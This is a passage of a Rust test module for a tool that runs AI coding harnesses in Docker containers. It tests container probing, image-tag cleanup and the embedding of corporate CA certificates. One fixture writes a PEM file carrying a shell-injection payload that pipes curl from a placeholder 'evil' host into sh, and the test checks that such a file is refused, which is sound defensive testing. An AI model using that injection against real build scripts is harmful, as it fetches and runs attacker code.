            "and neither does a probe that never ran"
        );
    }

    /// The stamp has the same three answers, for the same reason.
    ///
    /// An unreadable stamp was `unwrap_or_default()` into an empty map, and
    /// `container::drift` reads an empty map as *it predates this check, so
    /// nothing about it can be verified* — a `Restart`, which is `rm -f`. The
    /// same chain `Probe` closes, entered one line further down, with a
    /// fabricated reason attached to it.
    #[test]
    fn a_stamp_omh_could_not_read_is_not_a_container_that_predates_the_check() {
        let labels = r#"{"omh.harness":"claude","maintainer":"alpine"}"#;
        let Stamp::Read(read) = stamp_from(output(0, labels, "")) else {
            panic!("a readable stamp is read");
        };
        assert_eq!(read.get("omh.harness").map(String::as_str), Some("claude"));
        assert!(
            !read.contains_key("maintainer"),
            "and everybody else's labels stay out of it: {read:?}"
        );

        // The one empty answer that means something: docker prints `null` for
        // a container carrying no labels, which really does predate the check.
        assert_eq!(
            stamp_from(output(0, "null\n", "")),
            Stamp::Read(Default::default()),
            "a container with no labels is read, and read as empty"
        );

        for (code, stdout, stderr, what) in [
            (
                1,
                "",
                "failed to connect to the docker API",
                "a daemon that would not answer",
            ),
            (
                0,
                "not json at all",
                "",
                "an answer in a shape omh does not know",
            ),
        ] {
            let answered = stamp_from(output(code, stdout, stderr));
            assert!(
                matches!(&answered, Stamp::Unknown(_)),
                "{what} is not a container that predates the check: {answered:?}"
            );
        }
    }

    /// A runtime that would not answer is never read as *not running*.
    ///
    /// The defect this replaces was one `.unwrap_or(false)`, and it had four
    /// inputs of which no test could reach three. What it cost is not a
    /// cosmetic column: `stop_before_syncing` asks this question to decide
    /// whether a sync would overwrite the files of a live agent, and a Docker
    /// daemon that is down answered *nothing is running*.
    ///
    /// The states are the ones measured against docker 29.7.2, not invented:
    /// running prints an id, stopped and never-built print nothing, and only
    /// an unreachable daemon exits non-zero.
    #[test]
    fn a_runtime_that_will_not_answer_is_not_a_container_that_is_stopped() {
        assert_eq!(
            running_from(
                "omh-repo-s01",
                output(0, "omh-repo-s01\nomh-repo-s02\n", "")
            ),
            Running::Yes,
            "listed among the running ones"
        );
        assert_eq!(
            running_from("omh-repo-s01", output(0, "omh-repo-s02\n", "")),
            Running::No,
            "a listing that does not name it is an answer, and the answer is no"
        );
        assert_eq!(
            running_from("omh-repo-s01", output(0, "", "")),
            Running::No,
            "nothing running at all, asked and answered"
        );

        // The comparison is exact, which is the whole reason it happens here
        // rather than in a `--filter` the runtime parses as a regex.
        assert_eq!(
            running_from("omh-repo-s1", output(0, "omh-repo-s10\n", "")),
            Running::No,
            "a longer name that starts the same way is a different container"
        );
        assert_eq!(
            running_from("omh-omh.rs-s01", output(0, "omh-omhXrs-s01\n", "")),
            Running::No,
            "and a `.` in a repo name is a character, not a wildcard — which is \
             what `--filter name=^…$` made it"
        );

        // The one that matters. Both halves: not `No`, and carrying why.
        let daemon_down = "failed to connect to the docker API at unix:///var/run/docker.sock";
        let unknown = running_from("omh-repo-s01", output(1, "", daemon_down));
        assert_ne!(unknown, Running::No, "a failed question is not a `no`");
        assert!(
            matches!(&unknown, Running::Unknown(why) if why.contains("docker API")),
            "and it carries the runtime's own words: {unknown:?}"
        );

        // A non-zero exit that says nothing is still not a `no`. The tempting
        // reading — no error text, so nothing was wrong — is how this class of
        // bug is reintroduced.
        let quiet = running_from("omh-repo-s01", output(1, "", ""));
        assert!(
            matches!(&quiet, Running::Unknown(_)),
            "silence on stderr does not make a failure into an answer"
        );
        // And it says something rather than an empty reason, which reaches the
        // user as a sentence ending in a colon.
        assert!(
            matches!(&quiet, Running::Unknown(why) if why.contains('1')),
            "the exit status stands in for the words it did not say: {quiet:?}"
        );
        assert!(
            !format!("{quiet:?}").contains("exit status"),
            "and not `exited exit status: 1`: {quiet:?}"
        );

        // The runtime is on `PATH` before any of this — a spawn that fails
        // anyway is a machine in trouble, not a container that is stopped.
        assert!(
            matches!(
                running_from("omh-repo-s01", Err(std::io::Error::other("fork failed"))),
                Running::Unknown(_)
            ),
            "and neither does a spawn that never ran"
        );
    }

    /// Whatever the runtime says comes back through `untrusted`.
    ///
    /// This text reaches the terminal through a warning and through `sync`'s
    /// refusal. A container name is chosen by omh, but the rest of that line
    /// is the runtime's, and an image label or a mount path inside it is not.
    #[test]
    fn the_runtimes_own_words_are_sanitised_before_they_are_repeated() {
        let sneaky = "cannot connect\u{1b}[2J to the daemon";
        let Running::Unknown(why) = running_from("omh-repo-s01", output(1, "", sneaky)) else {
            panic!("a failed probe is Unknown");
        };
        assert!(
            !why.contains('\u{1b}'),
            "no escape reaches the terminal: {why:?}"
        );
        assert!(why.contains("cannot connect"), "the words survive: {why:?}");
    }

    /// Every backend asks the same question the same way: list what is
    /// running, one name per line, and fail loudly rather than quietly.
    ///
    /// Both implementations, because `select` prefers `sbx` under `auto` — so
    /// the unmeasured backend is the *default* one, and a third arriving with
    /// its own spelling is how the contract rots. This asserts the shape they
    /// share; what neither this nor any test can assert is that sbx's `ps`
    /// behaves as assumed, which `runtime.rs` says out loud.
    #[test]
    fn every_backend_asks_for_the_running_set_and_names_it() {
        use crate::runtime::Runtime;
        for backend in [
            &crate::runtime::Docker as &dyn Runtime,
            &crate::runtime::Sbx as &dyn Runtime,
        ] {
            let args = backend.running_args();
            assert!(
                args.first().is_some_and(|a| a == "ps"),
                "{}: the running set: {args:?}",
                backend.name()
            );
            assert!(
                !args.iter().any(|a| a == "-a"),
                "{}: running, not every container ever created: {args:?}",
                backend.name()
            );
            // No container name anywhere in the argv. Handing one to the
            // runtime is what made it a pattern, and `.` in a repo directory
            // name is legal in a container name and a regex wildcard.
            assert!(
                !args.iter().any(|a| a.contains("filter") || a.contains('^')),
                "{}: nothing the runtime will read as a pattern: {args:?}",
                backend.name()
            );
        }
    }

    /// omh tags an image by hashing its recipe, so a recipe change builds a new
    /// tag and the old one of that kind is superseded the moment it does.
    /// Nothing removed it.
    ///
    /// Measured 2026-08-18 with `docker system df` on a two-week-old machine:
    /// 14.86 GB of images, 9.95 GB of it reclaimable, across 14 omh tags — six
    /// `omh/claude`, three `omh/opencode`, three `omh/base`, two `omh/omp`.
    ///
    /// Summing the `SIZE` column of `docker images` instead gives about 20 GB,
    /// and that is the number *not* to quote: it charges every tag the full
    /// cost of the `node:22-bookworm-slim` and apt layers they share. What one
    /// superseded harness tag actually returns is its own install layer, which
    /// `docker system df -v` puts in the hundreds of kilobytes. The cost being
    /// paid down here is unbounded tag growth, not the gigabytes the `SIZE`
    /// column advertises — a whole dead chain frees real space, one dead tag
    /// beside its replacement mostly does not.
    ///
    /// Two things were observed on that machine and one is inferred: the disk
    /// filled, and Docker stopped responding until it was restarted by hand.
    /// That the first caused the second is a reasonable read and was never
    /// measured, so it is not a claim this makes.
    ///
    /// Also not addressed here, and larger on that machine than the images:
    /// buildkit's cache, 8.8 GB with 2.16 GB reclaimable. `docker image rm`
    /// cannot reach it — only `docker builder prune` can, and taking somebody's
    /// build cache is not a thing to do without being asked.
    ///
    /// omh reaps sessions, worktrees, staging and the sandbox's repository. An
    /// image is the one thing it creates and never takes back.
    #[test]
    fn a_new_build_supersedes_the_older_tags_of_its_class() {
        let tags = vec![
            "omh/claude:new".to_string(),
            "omh/claude:old".to_string(),
            "omh/claude:older".to_string(),
            "omh/claude:latest".to_string(),
        ];

        let gone = superseded("omh/claude:new", &tags, &[]);

        assert!(
            gone.contains(&"omh/claude:old".to_string())
                && gone.contains(&"omh/claude:older".to_string()),
            "the tags this build replaces: {gone:?}"
        );
        assert!(
            !gone.contains(&"omh/claude:new".to_string()),
            "never the one just built: {gone:?}"
        );
        assert!(
            !gone.contains(&"omh/claude:latest".to_string()),
            "no recipe omh still has reproduces `latest`, so removing it is \
             the one removal that cannot be undone: {gone:?}"
        );
    }

    /// A tag a container references is not superseded, whatever its age.
    /// Docker would refuse the removal anyway — this is so omh does not ask,
    /// and does not report removing something it did not.
    ///
    /// The stale tag is here so the test cannot pass by returning nothing.
    #[test]
    fn a_tag_a_container_is_using_survives_a_newer_build() {
        let tags = vec![
            "omh/claude:new".to_string(),
            "omh/claude:held".to_string(),
            "omh/claude:stale".to_string(),
        ];

        let gone = superseded("omh/claude:new", &tags, &["omh/claude:held".to_string()]);

        assert_eq!(
            gone,
            vec!["omh/claude:stale".to_string()],
            "the held tag stays and the stale one goes: {gone:?}"
        );
    }

    /// `docker image rm` exits 0 whether it deleted an image or merely dropped
    /// one of its names, and only the first frees a byte. Counting exit codes
    /// reports a reclaim that did not happen — and then `exists` says the tag
    /// is missing, so the next launch rebuilds it anyway.
    #[test]
    fn dropping_a_name_is_not_removing_an_image() {
        let untagged = "Untagged: omh/claude:old\n";
        let deleted = "Untagged: omh/claude:old\nDeleted: sha256:9aeb9a1e2d14\n";

        assert!(
            matches!(classify_removal(untagged), Removal::Untagged),
            "the image survives under its other name"
        );
        assert!(matches!(classify_removal(deleted), Removal::Deleted));
    }

    /// The tag space is not one-live-tag-per-repository, and the first version
    /// of `superseded` assumed it was.
    ///
    /// `stack_tag` and `tag_for` both format `omh/{adapter}:{hash}` — the same
    /// docker repository — so `omh/claude` holds the harness layer *and* one
    /// stack layer per checkout, every one of them current. Grouping by
    /// repository and keeping the newest made a stack build delete the harness
    /// image it was built from; the next launch rebuilt the harness, and that
    /// build deleted the stack.
    ///
    /// The class is `Kind`, stamped on at build time, so the three below are
    /// three different classes and no build of one supersedes another.
    #[test]
    fn a_stack_build_and_a_harness_build_are_not_the_same_class() {
        let adapter = claude();
        let here = Path::new("/checkouts/api");
        let there = Path::new("/checkouts/web");

        let harness = Kind::Harness(&adapter).stamp();
        let mine = Kind::Stack(&adapter, here).stamp();
        let theirs = Kind::Stack(&adapter, there).stamp();

        assert_ne!(
            mine, harness,
            "a stack layer is not the harness layer it was built FROM"
        );
        assert_ne!(
            mine, theirs,
            "another checkout's toolchain is not this build's to replace"
        );
        assert_ne!(
            harness,
            Kind::Base.stamp(),
            "the harness layer is not the base it was built FROM"
        );
    }

    /// The class has to reach docker, or it is a comment. Every value is free
    /// text — an adapter's `name` comes from a droppable TOML file, a checkout
    /// path can hold a comma — so the match is docker's to make by exact label
    /// equality, and omh never parses a label value back.
    #[test]
    fn the_listing_asks_docker_for_exactly_one_class() {
        let adapter = claude();
        let args = Kind::Stack(&adapter, Path::new("/checkouts/api")).list_args();

        for (k, v) in Kind::Stack(&adapter, Path::new("/checkouts/api")).stamp() {
            assert!(
                args.windows(2)
                    .any(|w| w[0] == "--filter" && w[1] == format!("label={k}={v}")),
                "{k} is part of the class but not part of the query: {args:?}"
            );
        }
    }

    /// An image built before omh stamped anything carries no `omh.*` labels, so
    /// it is in no class and no build reaps it. Never collecting them is the
    /// right trade against reaping every unlabelled image on the machine.
    #[test]
    fn an_unstamped_image_is_in_nobodys_class() {
        let adapter = claude();
        for kind in [
            Kind::Base,
            Kind::Harness(&adapter),
            Kind::Stack(&adapter, Path::new("/checkouts/api")),
        ] {
            assert!(
                !kind.stamp().is_empty(),
                "an empty stamp would match every unlabelled image"
            );
        }
    }

    fn adapters() -> &'static Path {
        Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/adapters"))
    }

    fn claude() -> Adapter {
        Adapter::find(adapters(), "claude").unwrap()
    }

    /// A corporate CA reaches the image, and changes what it is called.
    ///
    /// Behind a TLS-inspecting proxy — Zscaler and friends — every server the
    /// build talks to presents a certificate signed by the company's own root.
    /// The host trusts it, because IT put it in the system store. The
    /// container does not, so `apt-get`, the graph download and
    /// `npm install -g` the harness all fail on an unknown issuer, and omh
    /// cannot build an image at all.
    ///
    /// **Embedded in the recipe, not passed as a build arg.** A `--build-arg`
    /// leaves the Dockerfile text identical, so the tag — which is a digest of
    /// that text — would not move: an image built without the certificate
    /// would be reused for somebody who had set one, and setting it would
    /// appear to do nothing. That is the stale-tag failure `tag_for`'s own doc
    /// records. Embedding makes the certificate part of what the image *is*.
    ///
    /// Only the base needs it. The harness and stack layers are `FROM` it, so
    /// they inherit the trust store, and both tags already hash the base
    /// recipe — so one change moves all three.
    #[test]
    fn a_corporate_ca_reaches_the_image_and_moves_its_tag() {
        let pem = "-----BEGIN CERTIFICATE-----\nMIIBself\n-----END CERTIFICATE-----";
        let with = base_dockerfile(Some(pem));
        let without = base_dockerfile(None);

        // **Instructions only.** The block this layer emits opens with a
        // Dockerfile comment that names `update-ca-certificates`, so every
        // assertion below written against the recipe text was satisfied by the
        // comment: deleting `&& update-ca-certificates` from the RUN left the
        // whole suite green. What that hides is not cosmetic — the PEM still
        // lands under `/usr/local/share/ca-certificates`, but nothing merges
        // it into `/etc/ssl/certs/ca-certificates.crt`, which is where five of
        // the seven variables point.
        let commands: String = with
            .lines()
            .filter(|l| !l.trim_start().starts_with('#'))
            .collect::<Vec<_>>()
            .join("\n");

        assert!(
            commands.contains("MIIBself"),
            "the certificate is in the recipe"
        );
        assert!(
            commands.contains("&& update-ca-certificates"),
            "and a command — not a comment — rebuilds the system store from it"
        );

        // **One of these is load-bearing and six are belt and braces**, and
        // the difference is measured rather than assumed. Three arms against
        // an `openssl s_server` presenting a leaf signed by a private root:
        // with no root installed, every toolchain refuses. With the root in
        // the system store and *none* of these variables set, curl, python,
        // git, go, pip and cargo all verify — Debian's pip included, whose
        // vendored certifi resolves to the system bundle. Only node still
        // fails, with `UNABLE_TO_VERIFY_LEAF_SIGNATURE`. With the variables
        // set, node verifies too.
        //
        // So `NODE_EXTRA_CA_CERTS` is the one whose absence breaks a build on
        // today's base image. The rest are kept because they cost nothing and
        // cover a base image that patches its tools differently — but this
        // test must not claim they are each what makes their tool work, which
        // is what it used to say.
        //
        // **Values, not just names.** Asserting the name alone let two
        // mutations through: renaming the written file to `omh-ca.pem` (which
        // `update-ca-certificates` then skips, because it globs `*.crt`), and
        // pointing the bundle at `/etc/ssl/cert.pem`, which does not exist on
        // Debian. Both left the suite green while the sandbox trusted nothing.
        const BUNDLE: &str = "/etc/ssl/certs/ca-certificates.crt";
        const NODE_AT: &str = "/usr/local/share/omh-ca.pem";

        // One logical Dockerfile instruction: the line that opens it plus the
        // `\`-continuations under it.
        let instruction = |opens: &str| -> String {
            let mut out = String::new();
            let mut lines = commands
                .lines()
                .skip_while(|l| !l.trim_start().starts_with(opens));
            for line in lines.by_ref() {
                let continues = line.trim_end().ends_with('\\');
                out.push_str(line);
                out.push('\n');
                if !continues {
                    break;
                }
            }
            out
        };
        let env_block = instruction("ENV SSL_CERT_FILE");
        assert!(
            !env_block.is_empty(),
            "no `ENV` instruction sets the certificate variables: {commands}"
        );

        // The `/etc/environment` block is a `RUN`, and it is not the only
        // `RUN printf` in the recipe — the session entrypoint is another. Find
        // it by the redirect that makes it this one.
        let etc_environment = {
            let all: Vec<&str> = commands.lines().collect();
            let end = all
                .iter()
                .position(|l| l.contains(">> /etc/environment"))
                .unwrap_or_else(|| panic!("nothing writes /etc/environment: {commands}"));
            let start = all[..=end]
                .iter()
                .rposition(|l| l.trim_start().starts_with("RUN "))
                .expect("the redirect is inside a RUN");
            all[start..=end].join("\n")
        };
        for (var, value, why) in [
            (
                "NODE_EXTRA_CA_CERTS",
                NODE_AT,
                "node, measured to ignore the system store — without this the \
                 build fails where it failed before",
            ),
            (
                "SSL_CERT_FILE",
                BUNDLE,
                "openssl's default, which already points here — belt and braces",
            ),
            (
                "SSL_CERT_DIR",
                "/etc/ssl/certs",
                "openssl's by-hash lookups — belt and braces",
            ),
            (
                "REQUESTS_CA_BUNDLE",
                BUNDLE,
                "a requests that does not read the store — belt and braces",
            ),
            (
                "PIP_CERT",
                BUNDLE,
                "a pip vendoring its own certifi rather than Debian's — belt \
                 and braces",
            ),
            (
                "CARGO_HTTP_CAINFO",
                BUNDLE,
                "cargo, measured to read the store here — belt and braces",
            ),
            (
                "GIT_SSL_CAINFO",
                BUNDLE,
                "git, measured to read the store here — belt and braces",
            ),
        ] {
            // **Each instruction on its own, never the recipe as a whole.**
            // The `ENV` line and the `/etc/environment` block write the same
            // seven `VAR=VALUE` substrings, so a `commands.contains(..)` was
            // satisfied by either one — and the two blocks became each other's
            // alibi. Deleting the whole `ENV` instruction left all 1330 tests
            // green, which ships the original bug: `/etc/environment` is read
            // by `pam_env` at ssh login and by nothing else, so `docker build`
            // and `docker exec` would both lose `NODE_EXTRA_CA_CERTS` — the
            // one variable measured to be load-bearing.
            assert!(
                env_block.contains(&format!("{var}={value}")),
                "{var} is missing from the `ENV` instruction, so `docker \
                 build` and `docker exec` do not have it: {why}\n{env_block}"
            );
            assert!(
                etc_environment.contains(&format!("{var}={value}")),
                "{var} is missing from the `/etc/environment` block, so an \
                 ssh login from an editor does not have it: {why}\n\
                 {etc_environment}"
            );
            assert!(
                !without.contains(var),
                "{var} must not be set when there is no certificate"
            );
        }
        assert!(
            !without.contains("update-ca-certificates"),
            "and none of it appears when no certificate is set"
        );

        // The file the store is built from has to be one
        // `update-ca-certificates` will look at: it globs `*.crt` under that
        // directory and ignores everything else, silently.
        assert!(
            commands.contains("> /usr/local/share/ca-certificates/omh-ca-1.crt"),
            "the certificate must be written where update-ca-certificates \
             scans, under a name it will not skip: {commands}"
        );

        // **`ENV` does not reach an ssh login.** `omh s run` and `attach` go
        // through `docker exec`, which inherits the image environment, so they
        // were fine. Editor attach does not: `src/ssh.rs` hands VS Code, Zed
        // and JetBrains an `ssh://` target, and sshd builds a session
        // environment from PAM rather than passing its own — so node, pip and
        // cargo, the three that need telling separately from the system store,
        // lose their variables in an editor terminal while `curl` and `git`
        // keep working. The build succeeds, the session half-works, and the
        // docs promise both.
        //
        // `/etc/environment` is what `pam_env` reads, and sshd runs it.
        // The seven-variable loop above asserts this block by name *and*
        // value, so there is no separate list here any more. There used to be
        // one, over four of the seven, and it read
        // `commands.contains("{var}=") && commands.contains("/etc/environment")`
        // — a left half the `ENV` line satisfied and a right half independent
        // of `var`, so deleting six of the seven lines was green.

        // **Order, not just presence.** The first version put the certificate
        // at the top, before `apt-get install ca-certificates` — so
        // `update-ca-certificates` did not exist yet and every build died. It
        // has to land after the package that provides it and before the first
        // fetch that needs it, which is the graph download.
        //
        // Measured on `commands`, for the reason above: the same two
        // assertions against the raw recipe constrained where a comment sat.
        let at = |needle: &str| {
            commands
                .find(needle)
                .unwrap_or_else(|| panic!("{needle} is not a command in the recipe"))
        };
        assert!(
            at("install -y --no-install-recommends") < at("&& update-ca-certificates"),
            "the certificate must land after `ca-certificates` is installed, \
             or the command that reads it is not there yet"
        );
        // The graph install is the first thing in the recipe that fetches
        // over TLS, and it is substituted in, so the marker is what it
        // downloads rather than the placeholder.
        assert!(
            at("&& update-ca-certificates") < at("codebase-memory-mcp-ui-linux"),
            "and before the first fetch that needs it"
        );

        // **All three tags move, and the docstring's claim is now asserted.**
        // Only the base carries the certificate; the harness and stack layers
        // are `FROM` it and hash the base recipe, so one change moves all
        // three. Nothing checked that, and a tag that did not move is the
        // stale-tag failure `tag_for` records.
        let a = claude();
        assert_ne!(base_tag(Some(pem)), base_tag(None), "the base tag moves");
        assert_ne!(
            tag_for(&a, Some(pem)),
            tag_for(&a, None),
            "and the harness tag with it"
        );
        assert_ne!(
            stack_tag(&a, &["corepack enable pnpm"], Some(pem)),
            stack_tag(&a, &["corepack enable pnpm"], None),
            "and the stack tag, or a session runs an image built without it"
        );
        assert_ne!(
            recipe_digest(&with).unwrap(),
            recipe_digest(&without).unwrap(),
            "a different trust store is a different image"
        );
    }

    /// Two different certificates are two different images.
    ///
    /// The half that a `--build-arg` would have got wrong: it is not enough
    /// that *having* a certificate moves the tag, because somebody whose
    /// company rotates its root would otherwise keep building against the old
    /// one and be told it was already built.
    #[test]
    fn changing_the_certificate_changes_the_tag() {
        let a = base_dockerfile(Some(
            "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----",
        ));
        let b = base_dockerfile(Some(
            "-----BEGIN CERTIFICATE-----\nBBBB\n-----END CERTIFICATE-----",
        ));
        assert_ne!(recipe_digest(&a).unwrap(), recipe_digest(&b).unwrap());

        // The recipe digest is not where the bug lived. `tag_for` and
        // `stack_tag` are what a session resolves, and this test's name and
        // docstring are about tags — so assert on tags, not on the input they
        // happen to share today.
        let one = "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----";
        let two = "-----BEGIN CERTIFICATE-----\nBBBB\n-----END CERTIFICATE-----";
        let h = claude();
        assert_ne!(base_tag(Some(one)), base_tag(Some(two)));
        assert_ne!(tag_for(&h, Some(one)), tag_for(&h, Some(two)));
        assert_ne!(
            stack_tag(&h, &["corepack enable pnpm"], Some(one)),
            stack_tag(&h, &["corepack enable pnpm"], Some(two)),
            "a rotated root must rebuild the stack layer too, or the session \
             keeps running the image built against the retired one"
        );
    }

    #[test]
    fn tags_name_their_harness() {
        assert!(tag_for(&claude(), None).starts_with("omh/claude:"));
    }

    /// Regression: with a fixed `:latest`, `ensure` saw the tag present and
    /// skipped the build, so a Dockerfile fix never reached an install that had
    /// already built the old one — while `omh init` reported "already built".
    /// Regression: the base tag was a mutable `:latest`, so `ensure` skipped
    /// rebuilding it and a base change — adding `socat` — silently never shipped.
    #[test]
    fn a_changed_base_recipe_is_a_different_base_tag() {
        let before = base_tag(None);
        assert!(before.starts_with("omh/base:"));
        assert_ne!(before, "omh/base:latest", "a mutable tag never rebuilds");
    }

    /// The harness layer must pin the base it was built against, or a rebuilt
    /// base leaves the harness image referencing something that no longer exists.
    #[test]
    fn the_harness_layer_pins_an_exact_base() {
        let df = harness_dockerfile(&claude(), None);
        assert!(df.contains(&base_tag(None)), "got: {df}");
        assert!(!df.contains("omh/base:latest"), "got: {df}");
    }

    // ── the stack layer ─────────────────────────────────────────────────────

    /// The same discipline the harness layer already keeps: pin the exact layer
    /// below, never a mutable `:latest`. With a floating base, `ensure` sees the
    /// tag present and skips the build, so a recipe change never reaches an
    /// install that already built the old one.
    #[test]
    fn the_stack_layer_pins_the_exact_harness_layer() {
        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"], None);
        assert!(df.contains(&tag_for(&claude(), None)), "got: {df}");
        assert!(!df.contains(":latest"), "got: {df}");
    }

    /// A pnpm repo and a yarn repo are the same stack and **not** the same
    /// image. Without this the two share a tag, one silently gets the other's
    /// package manager, and the cache makes it stick — worse than no cache at
    /// all, because it is wrong and fast.
    #[test]
    fn a_different_set_of_fired_installs_is_a_different_tag() {
        let a = claude();
        let pnpm = stack_tag(&a, &["corepack enable pnpm"], None);
        let yarn = stack_tag(&a, &["corepack enable yarn"], None);
        let both = stack_tag(&a, &["corepack enable pnpm", "corepack enable yarn"], None);

        assert_ne!(pnpm, yarn, "different provides, different image");
        assert_ne!(pnpm, both, "a superset is a different image too");
        assert_eq!(
            pnpm,
            stack_tag(&a, &["corepack enable pnpm"], None),
            "and an unchanged resolution must not rebuild"
        );
        // Order is part of the recipe, not a presentation detail. `corepack
        // enable pnpm` needs the node the provide above it asserted, so a
        // reordered stack file describes a different image — and a tag that
        // hashed the *set* would hand that repo the image built in the old
        // order, which is a cache hit on a build that never happened.
        assert_ne!(
            both,
            stack_tag(&a, &["corepack enable yarn", "corepack enable pnpm"], None),
            "a reordered recipe is a different image"
        );
    }

    /// A repo whose settings say what this fixture wants them to say.
    fn ca_fixture(setting: Option<&str>) -> (tempfile::TempDir, crate::profile::Paths) {
        let dir = tempfile::tempdir().unwrap();
        let paths = crate::profile::Paths {
            root: dir.path().join("home"),
            repo: dir.path().join("repo"),
        };
        std::fs::create_dir_all(paths.repo.join(".omh")).unwrap();
        if let Some(at) = setting {
            std::fs::write(
                paths.repo.join(".omh/settings.toml"),
                format!("ca_cert = \"{at}\"\n"),
            )
            .unwrap();
        }
        (dir, paths)
    }

    const PEM: &str = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";

    /// **`ca_for` had no test at all**, and it is the function this whole
    /// feature turns on. Two mutations found by review both survived the full
    /// suite: replacing the `BEGIN CERTIFICATE` check with `true`, and turning
    /// the read error into `Ok(None)`. The second inverts the promise the
    /// function's own doc makes in bold — and produces exactly what that doc
    /// warns of, a rebuild of the image that was already failing, reported as
    /// success.
    ///
    /// Table-driven because the interesting property is that these answers are
    /// *distinguishable*. A set-but-unreadable certificate resolving to the
    /// same `None` as a certificate nobody set is the whole bug.
    #[test]
    fn ca_for_tells_absent_from_unreadable() {
        let (_d, paths) = ca_fixture(None);
        assert_eq!(
            ca_for(&paths).unwrap(),
            None,
            "a certificate nobody set is the one honest `None`"
        );

        let (dir, paths) = ca_fixture(Some("/nowhere/corp.pem"));
        let e = format!("{:#}", ca_for(&paths).unwrap_err());
        assert!(e.contains("/nowhere/corp.pem"), "must name the path: {e}");
        assert!(e.contains("ca_cert"), "and the setting: {e}");

        // A directory. `read_to_string` refuses it, and the refusal must not
        // be the DER advice below — converting a directory is not the fix.
        let at = dir.path().join("adir");
        std::fs::create_dir_all(&at).unwrap();
        let (_d2, paths) = ca_fixture(Some(&at.display().to_string()));
        assert!(ca_for(&paths).is_err(), "a directory is not a certificate");

        // Not a PEM. This is the one case where `openssl x509 -inform der` is
        // the right advice, so it is the one case that may give it.
        let at = dir.path().join("corp.der");
        std::fs::write(&at, [0x30u8, 0x82, 0x01, 0x0a]).unwrap();
        let (_d3, paths) = ca_fixture(Some(&at.display().to_string()));
        let e = format!("{:#}", ca_for(&paths).unwrap_err());
        assert!(e.contains("-inform der"), "must give the conversion: {e}");

        // Empty. Also not a PEM, and the DER advice would send the reader to
        // convert a file with nothing in it.
        let at = dir.path().join("empty.pem");
        std::fs::write(&at, "").unwrap();
        let (_d4, paths) = ca_fixture(Some(&at.display().to_string()));
        let e = format!("{:#}", ca_for(&paths).unwrap_err());
        assert!(e.contains("empty"), "an empty file is named as empty: {e}");
        assert!(
            !e.contains("-inform der"),
            "and is not sent to convert nothing: {e}"
        );

        // The one that works, byte for byte — the recipe embeds this text, so
        // anything lost here is lost in the image.
        let at = dir.path().join("corp.pem");
        std::fs::write(&at, PEM).unwrap();
        let (_d5, paths) = ca_fixture(Some(&at.display().to_string()));
        assert_eq!(ca_for(&paths).unwrap().as_ref().map(Root::pem), Some(PEM));
    }

    /// **A settings file omh cannot read is not a settings file with nothing
    /// in it.** `policy_value` answers `Option`, so `config::policy`'s two
    /// deliberate errors — a file that exists and cannot be read, and one that
    /// does not parse — both arrived here as "no certificate set", and the
    /// build then reported success on an image with no certificate in it.
    ///
    /// `config::read_layer` carries a comment about the closed loop that shape
    /// produces. This is the same loop, one layer up.
    #[test]
    fn a_settings_file_omh_cannot_parse_is_not_a_repo_without_a_certificate() {
        let (_d, paths) = ca_fixture(None);
        std::fs::write(
            paths.repo.join(".omh/settings.toml"),
            "ca_cert = \"unclosed\n",
        )
        .unwrap();
        let e = format!("{:#}", ca_for(&paths).unwrap_err());
        assert!(
            e.contains("settings") || e.contains("parsing"),
            "the refusal must name the file it could not read: {e}"
        );
    }

    /// **The comment said refuse; the code mangled.** `ca_layer` wrote each
    /// PEM line as a single-quoted `printf` argument and ran
    /// `.replace(['\'', '\\'], "")` over it first — silently deleting
    /// characters from a file the user named, while the comment above it said
    /// a certificate needing escaping is one to refuse rather than mangle.
    ///
    /// It is not hypothetical content: an `openssl pkcs12` export carries
    /// `Bag Attributes` and `friendlyName:` preamble lines, and company names
    /// carry apostrophes. Because the tag is a digest of the recipe, a mangled
    /// certificate names an image after a certificate that is not the one on
    /// disk.
    ///
    /// The check lives in `ca_for`, which already answers `Result` — that is
    /// what makes `ca_layer` correct by construction rather than careful.
    #[test]
    fn a_certificate_that_would_need_escaping_is_refused_not_rewritten() {
        let (dir, _) = ca_fixture(None);
        let at = dir.path().join("corp.pem");
        std::fs::write(
            &at,
            "friendlyName: O'Brien Corp Root\n-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n",
        )
        .unwrap();
        let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
        let e = format!("{:#}", ca_for(&paths).unwrap_err());
        assert!(
            e.contains("1") || e.to_lowercase().contains("line"),
            "the refusal must point at the line: {e}"
        );

        // And the shell-injection shape, which is the same defect read the
        // other way round. Refused, not neutralised by deletion.
        let at = dir.path().join("evil.pem");
        std::fs::write(
            &at,
            "-----BEGIN CERTIFICATE-----\n' && curl http://evil/ | sh && printf '\n-----END CERTIFICATE-----\n",
        )
        .unwrap();
        let (_d2, paths) = ca_fixture(Some(&at.display().to_string()));
        assert!(ca_for(&paths).is_err(), "a quote in a PEM body is refused");
    }

    /// **"Refuses" has to mean refuses.** Both doc pages promised that a
    /// `pkcs12` export carrying `Bag Attributes` / `friendlyName:` preamble is
    /// refused rather than rewritten. The code refused only a quote or a
    /// backslash, so a clean `friendlyName: Zscaler Root CA` was *accepted*
    /// and `ca_layer` then silently dropped it — a rewrite, which is the one
    /// thing the setting's whole design says omh will not do. The test that
    /// looked like it covered this passed on the apostrophe in `O'Brien`, not
    /// on the preamble.
    ///
    /// Three shapes, each a real way to hand omh a file that is not one
    /// certificate:
    ///
    /// - preamble outside the block, which `openssl pkcs12` emits;
    /// - a truncated block, which a clipped copy-paste of
    ///   `security find-certificate -a` produces — `BEGIN` with no `END` was
    ///   accepted, and `ca_layer` dropped the unterminated block, writing an
    ///   image with *no* certificate in it and a green build;
    /// - a CSR, whose `-----BEGIN CERTIFICATE REQUEST-----` contains the
    ///   substring `BEGIN CERTIFICATE` and so passed the old check.
    #[test]
    fn a_file_that_is_not_exactly_certificates_is_refused() {
        let (dir, _) = ca_fixture(None);
        let refuse = |name: &str, body: &str| -> String {
            let at = dir.path().join(name);
            std::fs::write(&at, body).unwrap();
            let (_d, paths) = ca_fixture(Some(&at.display().to_string()));
            let e = ca_for(&paths)
                .map(|got| {
                    panic!("{name} must be refused, got {got:?}");
                })
                .unwrap_err();
            format!("{e:#}")
        };

        // Preamble, with not a quote or backslash anywhere in it.
